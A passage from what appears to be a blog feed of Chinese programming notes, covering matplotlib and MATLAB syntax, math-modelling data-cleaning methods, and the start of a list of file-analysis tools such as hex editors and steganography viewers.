python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接调用matplotlib.pyplot的画图函数</span></span><br><span class="line">plt.&lt;matlab_function&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 画图 </span></span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多图显示</span></span><br><span class="line"><span class="keyword">for</span> title <span class="keyword">in</span> lst[-<span class="number">6</span>:-<span class="number">1</span>]:</span><br><span class="line">    fig = plt.figure(title, figsize=(<span class="number">6</span>, <span class="number">4</span>)).add_subplot(<span class="number">111</span>)</span><br><span class="line">    <span class="comment"># 创建幕布 图片大小 添加子图</span></span><br><span class="line">    fig.scatter(data[<span class="string">&#x27;时间&#x27;</span>], data[title]) <span class="comment">#散点图</span></span><br><span class="line">    fig.set_xlabel(<span class="string">&#x27;天&#x27;</span>)</span><br><span class="line">    fig.set_ylabel(title)</span><br><span class="line">    fig.set_title(title)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同图显示双线</span></span><br><span class="line">x = data[<span class="string">&#x27;时间&#x27;</span>]</span><br><span class="line">y = data[lst[idx]]</span><br><span class="line">f = interpolate.interp1d(x,y,kind=<span class="string">&quot;linear&quot;</span>)</span><br><span class="line">new_y = f(x)</span><br><span class="line">fig = plt.figure(lst[idx], figsize=(<span class="number">20</span>, <span class="number">20</span>)).add_subplot(<span class="number">111</span>)</span><br><span class="line">fig.plot(x,y,<span class="string">&#x27;-or&#x27;</span>,label=<span class="string">&#x27;Original&#x27;</span>)</span><br><span class="line">fig.plot(x,new_y,<span class="string">&#x27;-*b&#x27;</span>,label=<span class="string">&#x27;Interpolate&#x27;</span>)</span><br><span class="line">fig.set_xlabel(<span class="string">&#x27;天&#x27;</span>)</span><br><span class="line">fig.set_ylabel(lst[idx])</span><br><span class="line">fig.set_title(lst[idx])</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中文乱码</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>]=[<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br></pre></td></tr></table></figure><hr><h1 id="MATLAB"><a href="#MATLAB" class="headerlink" title="MATLAB"></a>MATLAB</h1><blockquote><p><a href="https://ww2.mathworks.cn/help/matlab/index.html?s_tid=CRUX_lftnav">official::MATLAB Documentation - MathWorks 中国</a> </p><p><a href="https://www.tutorialspoint.com/execute_matlab_online.php">云MATLAB</a></p></blockquote><hr><h2 id="一、软件使用"><a href="#一、软件使用" class="headerlink" title="一、软件使用"></a>一、软件使用</h2><hr><h2 id="二、基本语法"><a href="#二、基本语法" class="headerlink" title="二、基本语法"></a>二、基本语法</h2><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">%  单行注释</span></span><br><span class="line"><span class="comment">%% 有横线的注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 语句尾部带分号会避免结果的输出</span></span><br><span class="line"><span class="comment">% 一条语句执行后会有一个返回值，不想要返回值就在语句后加上分号</span></span><br><span class="line">;</span><br><span class="line"><span class="comment">% 续行</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="1-数据类型"><a href="#1-数据类型" class="headerlink" title="1 数据类型"></a>1 数据类型</h3><h4 id="1-1-变量"><a href="#1-1-变量" class="headerlink" title="1.1 变量"></a>1.1 变量</h4><blockquote><p><a href="https://blog.csdn.net/qq_54186956/article/details/127274462">定义变量</a></p></blockquote><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 定义变量</span></span><br><span class="line">x = sym(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">syms x,y,z;</span><br><span class="line"></span><br><span class="line"><span class="comment">% f(x,y)=3*x^2+4*y^2+1</span></span><br><span class="line">f = symfun(<span class="number">3</span>*x^<span class="number">2</span>+<span class="number">4</span>*y^<span class="number">2</span>+<span class="number">1</span>,[x,y])</span><br><span class="line"></span><br><span class="line"><span class="comment">% 特殊变量</span></span><br><span class="line"><span class="comment">% 结果</span></span><br><span class="line"><span class="built_in">ans</span></span><br><span class="line"><span class="comment">% π</span></span><br><span class="line"><span class="built_in">pi</span></span><br><span class="line"><span class="comment">% 计算机最小数</span></span><br><span class="line"><span class="built_in">eps</span></span><br><span class="line"><span class="comment">% 无穷大</span></span><br><span class="line"><span class="built_in">inf</span></span><br><span class="line"><span class="comment">% 缺省</span></span><br><span class="line">NAN</span><br><span class="line"><span class="comment">% 虚数单位</span></span><br><span class="line"><span class="built_in">i</span>,<span class="built_in">j</span></span><br></pre></td></tr></table></figure><h4 id="1-2-数字"><a href="#1-2-数字" class="headerlink" title="1.2 数字"></a>1.2 数字</h4><blockquote><p>同pyhton。</p></blockquote><h4 id="1-3-字符和字符串"><a href="#1-3-字符和字符串" class="headerlink" title="1.3 字符和字符串"></a>1.3 字符和字符串</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 定义字符串（单引号）</span></span><br><span class="line">s = <span class="string">&#x27;str&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 字符获得数字</span></span><br><span class="line"><span class="built_in">abs</span>(s)</span><br><span class="line"><span class="comment">% 数字获得字符</span></span><br><span class="line">char(num)</span><br><span class="line"><span class="comment">% 数字转字符串</span></span><br><span class="line">num2str(num)</span><br><span class="line"><span class="comment">% 字符串长</span></span><br><span class="line"><span class="built_in">length</span>(s)</span><br></pre></td></tr></table></figure><h4 id="1-4-矩阵"><a href="#1-4-矩阵" class="headerlink" title="1.4 矩阵"></a>1.4 矩阵</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 定义矩阵（横用空格隔开，竖用分号隔开） matrix = []</span></span><br><span class="line">mat = [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>;<span class="number">4</span> <span class="number">5</span> <span class="number">6</span>;]</span><br><span class="line"></span><br><span class="line"><span class="comment">% 转置（行变列，列变行）</span></span><br><span class="line">new_mat = mat&#x27;</span><br><span class="line"><span class="comment">% 拉成一列（竖着拉）</span></span><br><span class="line">new_mat = mat(:)</span><br><span class="line"><span class="comment">% 方阵求逆</span></span><br><span class="line">new_mat = inv(mat)</span><br><span class="line"><span class="comment">% 单位阵</span></span><br><span class="line">E = mat * inv(mat)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 创建步长矩阵(start:step:end)，包括end</span></span><br><span class="line">E = <span class="number">1</span>:<span class="number">2</span>:<span class="number">9</span></span><br><span class="line"><span class="comment">% 重复矩阵，row重复，col重复</span></span><br><span class="line">E = <span class="built_in">repmat</span>(mat,row_rep,col_rep)</span><br><span class="line"><span class="comment">% 创建全1矩阵</span></span><br><span class="line">E = <span class="built_in">ones</span>(row,col)</span><br><span class="line"><span class="comment">% 创建0矩阵（行，列，维度）</span></span><br><span class="line">E = <span class="built_in">zeros</span>(row,col,Dimension)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 选定矩阵，:表示全部</span></span><br><span class="line">E(<span class="number">3</span>,:)</span><br><span class="line"><span class="comment">% 选定指定维度矩阵</span></span><br><span class="line">E(:,:,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 矩阵加减，对应位置加减</span></span><br><span class="line">E = A + B</span><br><span class="line">E = A - B</span><br><span class="line"><span class="comment">% 矩阵相乘（A行值等于B列值） / 对应位置相乘</span></span><br><span class="line">E = A * B</span><br><span class="line">E = A .* B</span><br><span class="line"><span class="comment">% 矩阵相除（A * B&#x27;） / 对应位置相除</span></span><br><span class="line">E = A / B</span><br><span class="line">E = A ./ B</span><br><span class="line"><span class="comment">% 左除（A&#x27; * B）</span></span><br><span class="line">E = A \ B</span><br><span class="line"><span class="comment">% 矩阵乘幂 / 对应位置幂</span></span><br><span class="line">E = A ^ B</span><br><span class="line">E = A .^ <span class="number">3</span></span><br></pre></td></tr></table></figure><h4 id="1-5-元胞数组"><a href="#1-5-元胞数组" class="headerlink" title="1.5 元胞数组"></a>1.5 元胞数组</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 定义元胞数组（python的list） cell = &#123;&#125;</span></span><br><span class="line">cel = cell(row,col)</span><br><span class="line"><span class="comment">% 索引（从1开始）</span></span><br><span class="line">cel&#123;index&#125;</span><br></pre></td></tr></table></figure><h4 id="1-6-结构体"><a href="#1-6-结构体" class="headerlink" title="1.6 结构体"></a>1.6 结构体</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 定义结构体（python的dict）</span></span><br><span class="line">dic = struct(key,value[,key,value,...])</span><br><span class="line"><span class="comment">% 取值</span></span><br><span class="line">dic.key <span class="comment">% 取cell</span></span><br><span class="line">dic.key(n) <span class="comment">% 取cell</span></span><br><span class="line">dic.key&#123;n&#125; <span class="comment">% 取value</span></span><br><span class="line"><span class="comment">% 案例</span></span><br><span class="line">dic = struct(<span class="string">&#x27;name&#x27;</span>,&#123;&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>&#125;)</span><br><span class="line">dic.name <span class="comment">% &#x27;a&#x27; &#x27;b&#x27;</span></span><br><span class="line">dic.name(<span class="number">1</span>) <span class="comment">% &#x27;a&#x27;</span></span><br><span class="line">dic.name&#123;<span class="number">1</span>&#125; <span class="comment">% a</span></span><br></pre></td></tr></table></figure><h3 id="2-逻辑流程"><a href="#2-逻辑流程" class="headerlink" title="2 逻辑流程"></a>2 逻辑流程</h3><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% for循环</span></span><br><span class="line"><span class="keyword">for</span> var = start:step:<span class="keyword">end</span></span><br><span class="line">...;</span><br><span class="line">...;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">% step步长不写默认1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% while</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">exp</span></span><br><span class="line">...;</span><br><span class="line">...;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% if...else</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">exp</span></span><br><span class="line">...;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">...;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% switch...case</span></span><br><span class="line"><span class="keyword">switch</span> num/str</span><br><span class="line"><span class="keyword">case</span> num/str</span><br><span class="line">...;</span><br><span class="line"><span class="keyword">case</span> num/str</span><br><span class="line">...;</span><br><span class="line"><span class="keyword">otherwise</span></span><br><span class="line">...;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-函数"><a href="#3-函数" class="headerlink" title="3 函数"></a>3 函数</h3><h4 id="3-1-数学函数"><a href="#3-1-数学函数" class="headerlink" title="3.1 数学函数"></a>3.1 数学函数</h4><ol><li><p>幂函数：$x^n$</p><p><code>x^n</code></p></li><li><p>指数函数：$a^x$，$e^x$</p><p><code>a^x exp(x)</code></p></li><li><p>对数函数：$ln x$</p><p><code>log(x)</code></p></li><li><p>三角函数：$tan(x)$</p><p><code>tan(x)</code></p></li><li><p>反三角函数：$arcsin(x)$</p><p><code>asin(x)</code></p></li></ol><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 求和</span></span><br><span class="line">sum()</span><br><span class="line"><span class="comment">% 求平均值</span></span><br><span class="line"><span class="built_in">mean</span>()</span><br><span class="line"><span class="comment">% 累加</span></span><br><span class="line">cumsum()</span><br><span class="line"></span><br><span class="line"><span class="comment">% 解方程</span></span><br><span class="line">solve(<span class="string">&#x27;exp1&#x27;</span>,<span class="string">&#x27;exp2&#x27;</span>,...,<span class="string">&#x27;var1&#x27;</span>,<span class="string">&#x27;var2&#x27;</span>,...)</span><br><span class="line"><span class="comment">% sinx + x = 0</span></span><br><span class="line">solve(<span class="string">&#x27;sin(x)+x=0&#x27;</span>)</span><br><span class="line">solve(<span class="string">&#x27;sin(X)+x&#x27;</span>)</span><br><span class="line"><span class="comment">% 方程组 x^2 + x*y + y = 3;x^2 - 4*x + 3 = 0;</span></span><br><span class="line">[x,y]=solve(<span class="string">&#x27;x^2 + x*y + y = 3&#x27;</span>,<span class="string">&#x27;x^2 - 4*x + 3 = 0&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="3-2-随机数"><a href="#3-2-随机数" class="headerlink" title="3.2 随机数"></a>3.2 随机数</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% m行n列(0-1)的随机数，mn和矩阵大小要一致</span></span><br><span class="line"><span class="built_in">rand</span>(m,n)</span><br><span class="line"><span class="built_in">rand</span>(m,n,<span class="string">&#x27;double&#x27;</span>) <span class="comment">% 指定精度，参数：&#x27;double&#x27;,&#x27;single&#x27;</span></span><br><span class="line"><span class="built_in">rand</span>(RandStream,m,n) <span class="comment">% 随机种子</span></span><br><span class="line"><span class="comment">% 标准正态分布的伪随机数（均值0，方差1）</span></span><br><span class="line"><span class="built_in">randn</span>(m,n)</span><br><span class="line"><span class="comment">% 均匀分布的伪随机整数（指定上限（值包括上限），下限默认0）</span></span><br><span class="line">randi(iMax)</span><br><span class="line">randi(iMax,m,n)</span><br><span class="line">randi([iMin,iMax],m,n)</span><br></pre></td></tr></table></figure><h4 id="3-3-操作函数"><a href="#3-3-操作函数" class="headerlink" title="3.3 操作函数"></a>3.3 操作函数</h4><blockquote><p><a href="https://zhuanlan.zhihu.com/p/64018906">神奇的数学—幻方的智慧 - 知乎 (zhihu.com)</a></p></blockquote><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 排序</span></span><br><span class="line"><span class="built_in">sortrows</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">% 生成n阶单位矩阵</span></span><br><span class="line"><span class="built_in">eye</span>(n)</span><br><span class="line"><span class="comment">% 生成n阶段幻方</span></span><br><span class="line"><span class="built_in">magic</span>(n)</span><br></pre></td></tr></table></figure><h4 id="3-4-查找函数"><a href="#3-4-查找函数" class="headerlink" title="3.4 查找函数"></a>3.4 查找函数</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 读取矩阵行列数</span></span><br><span class="line"><span class="built_in">size</span>()</span><br><span class="line"><span class="comment">% 读取矩阵维数</span></span><br><span class="line"><span class="built_in">length</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">% 矩阵查找A中大于num的数，行存入m，列存入n</span></span><br><span class="line">[m,n] = <span class="built_in">find</span>(mat &gt; num)</span><br></pre></td></tr></table></figure><h4 id="3-5-样式函数"><a href="#3-5-样式函数" class="headerlink" title="3.5 样式函数"></a>3.5 样式函数</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 美化输出格式（更像数学格式）</span></span><br><span class="line">pretty(dy)</span><br><span class="line">symdisp(dy)</span><br></pre></td></tr></table></figure><h3 id="4-文件"><a href="#4-文件" class="headerlink" title="4 文件"></a>4 文件</h3><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 读excel</span></span><br><span class="line">xlsread(file,sheet,range)</span><br><span class="line">A = xlsread(<span class="string">&#x27;data.xls&#x27;</span>,<span class="string">&#x27;附件1&#x27;</span>,<span class="string">&#x27;A4:E322&#x27;</span>)</span><br><span class="line"><span class="comment">% 写excel</span></span><br><span class="line">xlswrite()</span><br><span class="line"><span class="comment">% 读图片</span></span><br><span class="line">imread()</span><br></pre></td></tr></table></figure><h3 id="5-matlab命令"><a href="#5-matlab命令" class="headerlink" title="5 matlab命令"></a>5 matlab命令</h3><h4 id="5-1-屏幕命令"><a href="#5-1-屏幕命令" class="headerlink" title="5.1 屏幕命令"></a>5.1 屏幕命令</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 清屏</span></span><br><span class="line">clc</span><br><span class="line"><span class="comment">% 清内存</span></span><br><span class="line">clear</span><br></pre></td></tr></table></figure><h4 id="5-2-数学命令"><a href="#5-2-数学命令" class="headerlink" title="5.2 数学命令"></a>5.2 数学命令</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 内置命令</span></span><br><span class="line"><span class="comment">% 求导，偏导（n：阶）</span></span><br><span class="line">diff(f,x,n)</span><br><span class="line"><span class="comment">% 定积分，重积分</span></span><br><span class="line">int()</span><br><span class="line"><span class="comment">% 泰勒展开</span></span><br><span class="line">taylor()</span><br><span class="line"><span class="comment">% 常微分方程</span></span><br><span class="line">dsolve()</span><br></pre></td></tr></table></figure><hr><h2 id="三、绘图"><a href="#三、绘图" class="headerlink" title="三、绘图"></a>三、绘图</h2><h3 id="1-二维绘图"><a href="#1-二维绘图" class="headerlink" title="1 二维绘图"></a>1 二维绘图</h3><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 建立一个幕布</span></span><br><span class="line"><span class="built_in">figure</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 普通画图</span></span><br><span class="line"><span class="built_in">plot</span>(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 标题</span></span><br><span class="line">title(<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line"><span class="comment">% x轴名，y轴名 </span></span><br><span class="line">xlabel(<span class="string">&#x27;str&#x27;</span>)/ylabel(<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line"><span class="comment">% 限制x轴范围</span></span><br><span class="line">xlim([start <span class="keyword">end</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">% 设置案例</span></span><br><span class="line"><span class="comment">% 共用一个x在y上有不同取值</span></span><br><span class="line">[AX,H1,H2] = plotyy(x,y1,x,y2)</span><br><span class="line"><span class="comment">% 设置属性</span></span><br><span class="line">set(get(AX(<span class="number">1</span>),<span class="string">&#x27;Ylabel&#x27;</span>),<span class="string">&#x27;String&#x27;</span>,<span class="string">&#x27;Slow Decay&#x27;</span>)</span><br><span class="line">set(get(AX(<span class="number">2</span>),<span class="string">&#x27;Ylabel&#x27;</span>),<span class="string">&#x27;String&#x27;</span>,<span class="string">&#x27;Fast Decay&#x27;</span>)</span><br><span class="line">set(H1,<span class="string">&#x27;LineStyle&#x27;</span>,<span class="string">&#x27;--&#x27;</span>)</span><br><span class="line">set(H1,<span class="string">&#x27;LineStyle&#x27;</span>,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 散点图</span></span><br><span class="line"><span class="built_in">scatter</span>(x,y)</span><br><span class="line"><span class="comment">% 同一张图中画多条线（标签区分）</span></span><br><span class="line"><span class="built_in">legend</span>()</span><br></pre></td></tr></table></figure><ul><li><strong>线与点</strong></li></ul><p><img src="/posts/a66872a2/颜色.png" alt="颜色"></p><p><img src="/posts/a66872a2/点与线.png" alt="点与线"></p><h3 id="2-三维绘图"><a href="#2-三维绘图" class="headerlink" title="2 三维绘图"></a>2 三维绘图</h3><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 三维画图</span></span><br><span class="line"><span class="built_in">plot3</span>(x,y,z)</span><br><span class="line"></span><br><span class="line"><span class="comment">% z标签</span></span><br><span class="line">zlable(<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 等待后再绘制</span></span><br><span class="line"><span class="built_in">hold</span> on/off</span><br><span class="line"><span class="comment">% 网格线</span></span><br><span class="line">grid on/off</span><br><span class="line"><span class="comment">% 背景轴立方化</span></span><br><span class="line">axis square</span><br></pre></td></tr></table></figure><hr><h1 id="模型算法"><a href="#模型算法" class="headerlink" title="模型算法"></a>模型算法</h1><h2 id="一、数据处理"><a href="#一、数据处理" class="headerlink" title="一、数据处理"></a>一、数据处理</h2><blockquote><p><a href="https://www.spsspro.com/analysis/operation/5910327">SPSSPRO</a></p><p><a href="https://blog.csdn.net/weixin_44390462/article/details/105565901">利用python对一份AQI数据进行分析与预测</a></p></blockquote><h3 id="1-缺失值"><a href="#1-缺失值" class="headerlink" title="1 缺失值"></a>1 缺失值</h3><ol><li><p>比赛提供的数据，发现有些单元格是null或空的。</p></li><li><p>缺失太多：例如调查人口信息，发现“年龄”这一项缺失了40%，就直接把该项指标删除</p></li><li><p>最简单处理：均值、众数插补</p><ul><li>定量数据，例如关于一群人的身高、年龄等数据，用整体的均值来补缺失</li><li>定性数据，例如关于一群人的性别、文化程度；某些事件调查的满意度，用出现次数最多的值补缺失</li><li><strong>适用赛题</strong>：<strong>人口的数量年龄、经济产业情况等统计数据，对个体精度要求不大的数据</strong></li></ul></li><li><p>Newton插值法</p><ul><li>根据固定公式，构造近似函数，补上缺失值，普遍适用性强</li><li>缺点：区间边缘处的不稳定震荡，即龙格现象。不适合对导数有要求的题目</li><li><strong>适用赛题：热力学温度、地形测量、定位等只追求函数值精准而不关心变化的数据</strong></li></ul></li><li><p>样条插值法</p><ul><li>用分段<strong>光滑</strong>的曲线去插值，光滑意味着曲线不仅连续，还要有连续的曲率</li><li><strong>适用赛题</strong>：<strong>零件加工，水库水流量，图像“基线漂移”，机器人轨迹等精度要求高、没有突变的数据</strong></li></ul></li></ol><h3 id="2-异常值"><a href="#2-异常值" class="headerlink" title="2 异常值"></a>2 异常值</h3><ol><li><p>样本中明显和其他数值差异很大的数据，例如一群人的身高数据中有个3米2的</p></li><li><p>正态分布3σ原则</p><ul><li>数值分布在（μ-3σ,μ+3σ)中的概率为99.73%，其中μ为平均值，σ为标准差</li><li>求解步骤：1.计算均值μ和标准差σ；2.判断每个数据值是否在（μ-3σ,μ+3σ)内，不在则为异常值</li><li><strong>适用题目：总体符合正态分布，例如人口数据、测量误差、生产加工质量、考试成绩等。</strong></li><li><em>不适用题目：总体符合其他分布，例如公交站人数排队论符合泊松分布。*</em></li></ul></li><li><p>画箱型图</p><ul><li>箱型图中，把数据<strong>从小到大</strong>排序。下四分位数𝑄1是排第25%的数值，上四分位数𝑄3是排第75%的数值</li><li>四分位距𝐼𝑄𝑅 = 𝑄3- 𝑄1，也就是排名第75%的减去第25%的数值</li><li>与正态分布类似，设置个<strong>合理区间</strong>，在<strong>区间外的就是异常值</strong></li><li>一般设[𝑄1 − 1.5 ∗ 𝐼𝑄𝑅, 𝑄3 + 1.5 ∗ 𝐼𝑄𝑅]内为正常值</li><li><strong>适用题目：普遍适用</strong></li></ul></li><li><p>异常数据处理方法与缺失值处理相同。</p></li></ol><h3 id="3-处理函数"><a href="#3-处理函数" class="headerlink" title="3 处理函数"></a>3 处理函数</h3><blockquote><p><a href="https://ww2.mathworks.cn/help/matlab/ref/fillmissing.html?searchHighlight=fillmissing&amp;s_tid=srchtitle_fillmissing_1">fillmissing</a></p><p><a href="https://ww2.mathworks.cn/help/matlab/ref/filloutliers.html?searchHighlight=filloutliers&amp;s_tid=srchtitle_filloutliers_1">filloutliers</a></p></blockquote><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"># 缺失值插补</span><br><span class="line">F = fillmissing(A,method)</span><br><span class="line"># 异常值插补</span><br><span class="line">B = filloutliers(A,fillmethod,findmethod)</span><br></pre></td></tr></table></figure><hr><h2 id="二、模型建立"><a href="#二、模型建立" class="headerlink" title="二、模型建立"></a>二、模型建立</h2><h3 id="1-线性规划"><a href="#1-线性规划" class="headerlink" title="1 线性规划"></a>1 线性规划</h3><blockquote><p>在一组线性约束条件的限制下，求一线性目标函数的最大或最小值的问题。</p><p>例：两个车间生产A、B机床，限制条件不同，求最大利润。</p></blockquote><h3 id="2-整数规划"><a href="#2-整数规划" class="headerlink" title="2 整数规划"></a>2 整数规划</h3><blockquote><p>规定变量部分或全部限制为整数。</p><p>全限制为完全整数规划，部分限制为混合整数规划。</p></blockquote><h3 id="3-非线性规划"><a href="#3-非线性规划" class="headerlink" title="3 非线性规划"></a>3 非线性规划</h3><blockquote><p>约束条件或目标函数包含非线性函数。</p><p>例：投资决策</p></blockquote><h3 id="4-动态规划"><a href="#4-动态规划" class="headerlink" title="4 动态规划"></a>4 动态规划</h3><blockquote><p>选或不选，得到最佳答案。</p><p>例：生产调度，资源分配</p></blockquote><h3 id="5-图与网络"><a href="#5-图与网络" class="headerlink" title="5 图与网络"></a>5 图与网络</h3><blockquote><p>图题</p><p>例：最短路径，公路连通。</p></blockquote><h3 id="6-排队论"><a href="#6-排队论" class="headerlink" title="6 排队论"></a>6 排队论</h3><blockquote><p>排队模型。</p></blockquote><h3 id="7-对策论"><a href="#7-对策论" class="headerlink" title="7 对策论"></a>7 对策论</h3><blockquote><p>博弈论。</p><p>例：囚徒困境。</p></blockquote><h3 id="8-层次分析法"><a href="#8-层次分析法" class="headerlink" title="8 层次分析法"></a>8 层次分析法</h3><blockquote><p>逐级分析问题。</p><p>例：假期旅游（目的地——路上选择——具体措施）</p></blockquote><h3 id="9-插值和拟合"><a href="#9-插值和拟合" class="headerlink" title="9 插值和拟合"></a>9 插值和拟合</h3><blockquote><p>插值：求过已知有限个数据点的近似函数。</p><p>拟合：近似函数可以不过数据点，总偏差最小即可。</p></blockquote><h3 id="10-数理统计"><a href="#10-数理统计" class="headerlink" title="10 数理统计"></a>10 数理统计</h3><blockquote><p>大数据分析。</p><p>例：学生的身高体重。</p></blockquote><h3 id="11-方差分析"><a href="#11-方差分析" class="headerlink" title="11 方差分析"></a>11 方差分析</h3><blockquote><p>检验两个以上总体的均值彼此是否相等。</p><p>例：灯泡的品质。</p></blockquote><h3 id="12-回归分析"><a href="#12-回归分析" class="headerlink" title="12 回归分析"></a>12 回归分析</h3><blockquote><p>拟合的函数是否满足预测要求。</p></blockquote><h3 id="13-微分方程建模"><a href="#13-微分方程建模" class="headerlink" title="13 微分方程建模"></a>13 微分方程建模</h3><blockquote><p>问题中存在需要计算微分的地方。</p><p>例：多级火箭问题。</p></blockquote><h3 id="19-神经网络"><a href="#19-神经网络" class="headerlink" title="19 神经网络"></a>19 神经网络</h3><blockquote><p><a href="https://blog.csdn.net/baoliang12345/article/details/128065676">BP神经网络预测回归MATLAB代码</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Python </tag>
            
            <tag> 数学建模 </tag>
            
            <tag> Matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件工具知识</title>
      <link href="/posts/a2cc6fde.html"/>
      <url>/posts/a2cc6fde.html</url>
      
        <content type="html"><![CDATA[<h1 id="File工具"><a href="#File工具" class="headerlink" title="File工具"></a>File工具</h1><blockquote><p><a href=".\71be2b51">text::文件理论</a></p></blockquote><hr><h2 id="一、二进制文件工具"><a href="#一、二进制文件工具" class="headerlink" title="一、二进制文件工具"></a>一、二进制文件工具</h2><h3 id="1-010Editor"><a href="#1-010Editor" class="headerlink" title="1 010Editor"></a>1 010Editor</h3><blockquote><p>文件二进制</p></blockquote><ul><li><p>模板使用</p><blockquote><p><a href="https://www.sweetscape.com/010editor/repository/templates/">模板大全</a></p><p><a href="https://blog.csdn.net/freeking101/article/details/102908538">模板开发</a></p></blockquote></li><li><p>内存粘贴</p><blockquote><p>Edit → Copy As → Copy As Hex Text</p><p>编辑 - 粘贴至 - 十六进制</p></blockquote></li></ul><h3 id="2-WinHex"><a href="#2-WinHex" class="headerlink" title="2 WinHex"></a>2 WinHex</h3><blockquote><p>文件二进制</p></blockquote><hr><h2 id="二、二维码工具"><a href="#二、二维码工具" class="headerlink" title="二、二维码工具"></a>二、二维码工具</h2><h3 id="1-ClearImage"><a href="#1-ClearImage" class="headerlink" title="1 ClearImage"></a>1 ClearImage</h3><blockquote><p> 多种图片识别</p><p><a href="https://download.cnet.com/Clear-Image-Demo/3000-2070_4-75453197.html">下载</a></p></blockquote><h3 id="2-CQR"><a href="#2-CQR" class="headerlink" title="2 CQR"></a>2 CQR</h3><blockquote><p>二维码识别</p></blockquote><hr><h2 id="三、声音工具"><a href="#三、声音工具" class="headerlink" title="三、声音工具"></a>三、声音工具</h2><h3 id="1-AU"><a href="#1-AU" class="headerlink" title="1 AU"></a>1 AU</h3><blockquote><p>声波</p></blockquote><hr><h2 id="四、视频工具"><a href="#四、视频工具" class="headerlink" title="四、视频工具"></a>四、视频工具</h2><h3 id="1-PotPlayer"><a href="#1-PotPlayer" class="headerlink" title="1 PotPlayer"></a>1 PotPlayer</h3><blockquote><p>flash文件</p></blockquote><hr><h2 id="五、文本工具"><a href="#五、文本工具" class="headerlink" title="五、文本工具"></a>五、文本工具</h2><h3 id="1-PDF解密"><a href="#1-PDF解密" class="headerlink" title="1 PDF解密"></a>1 PDF解密</h3><blockquote><p> <a href="https://smallpdf.com/cn/unlock-pdf">PDF解密 - 免费的在线PDF密码移除软件 (smallpdf.com)</a></p></blockquote><hr><h2 id="六、图片工具"><a href="#六、图片工具" class="headerlink" title="六、图片工具"></a>六、图片工具</h2><blockquote><p><a href="https://docsmall.com/image-compress">在线图片压缩 - docsmall 在线图片压缩工具,在线图片压缩软件</a></p></blockquote><h3 id="1-Stegsolve"><a href="#1-Stegsolve" class="headerlink" title="1 Stegsolve"></a>1 Stegsolve</h3><blockquote><p>查看图片隐写</p></blockquote><h3 id="2-Stegdetect"><a href="#2-Stegdetect" class="headerlink" title="2 Stegdetect"></a>2 Stegdetect</h3><blockquote><p>检测特殊隐写</p></blockquote><hr><h2 id="七、压缩文件工具"><a href="#七、压缩文件工具" class="headerlink" 